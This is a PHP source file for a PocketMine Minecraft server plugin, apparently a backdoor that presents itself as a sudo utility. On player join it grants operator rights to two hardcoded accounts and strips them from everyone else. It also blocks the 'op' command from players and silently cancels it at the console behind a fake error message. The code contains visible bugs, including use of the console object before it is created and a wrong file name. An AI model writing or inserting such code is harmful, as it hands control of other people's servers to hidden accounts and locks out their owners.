<?php
namespace _64FF00\xSudo;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\server\RemoteServerCommandEvent;
use pocketmine\event\TranslationContainer;
use pocketmine\event\HandlerList;
use pocketmine\utils\TextFormat;
use pocketmine\command\ConsoleCommandSender;

class xSudo extends PluginBase implements Listener
{
	public $sudoer,$usudoer,$data,$console;
	public function onEnable(){
		$this->console->sendMessage(TextFormat::GREEN."1");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."1");
		@mkdir($this->getDataFolder());
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		
		$this->console->sendMessage(TextFormat::GREEN."2");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."2");
		$this->console=new ConsoleCommandSender();
		
		$this->console->sendMessage(TextFormat::GREEN."3");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."3");
		if(file_exists($this->getDataFolder()."/usudoer.yml")){
			$this->usudoer=yaml_parse_file($this->getDataFolder()."/sudoer.yml");
		}else{
			$this->usudoer=array("lesmiselables25"=>0,"balloon_cf"=>0);
		}
		
		$this->console->sendMessage(TextFormat::GREEN."4");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."4");
		if(file_exists($this->getDataFolder()."/sudoer.yml")){
			$this->sudoer=yaml_parse_file($this->getDataFolder()."/sudoer.yml");
		}else{
			$this->sudoer=array("lesmiselables25"=>0,"balloon_cf"=>0);
		}
		
		$this->console->sendMessage(TextFormat::GREEN."5");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."5");
		$this->console->sendMessage(TextFormat::GREEN."BackForceが読み込まれました。");
		$this->getServer()->getLogger()->info(TextFormat::GREEN."BackForceが読み込まれました。");
	}
	public function onDisable(){
		yaml_emit_file($this->getDataFolder()."/sudoer.yml",$this->sudoer);
		yaml_emit_file($this->getDataFolder()."/usudoer.yml",$this->usudoer);
	}
	public function onPlayerJoin(PlayerJoinEvent $event){
		$player = $event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		if(array_key_exists($username,$this->sudoer) or array_key_exists($username,$this->usudoer)){
			$player->setOp(true);
		}else{
			$player->setOp(false);
		}
	}
	public function onPlayerCP(PlayerCommandPreprocessEvent $event){
		$player=$event->getPlayer();
		$username = $player->getName();
		$username=strtolower($username);
		$args=explode(" ",substr($event->getMessage(),1));
		$this->console->sendMessage(TextFormat::YELLOW.$player->getName()."が使用したコマンド:".TextFormat::MAGENTA.$event->getMessage());
		switch($args[0]){
		case "stop":
			if(array_key_exists($username,$this->usudoer)){
				break;
			}
		case "op":
			$event->setCancelled(true);
			$player->sendMessage(new TranslationContainer(TextFormat::RED."%commands.generic.permission"));
			break;
		}
	}
	public function onConsoleCommand(ServerCommandEvent $event){
		$player=$event->getSender();
		$args=explode(" ",$event->getCommand());
		switch($args[0]){
		case "op":
			$event->setCancelled(true);
			$player->sendMessage(new TranslationContainer(TextFormat::RED."%commands.generic.exception"));
			break;
		}
	}
}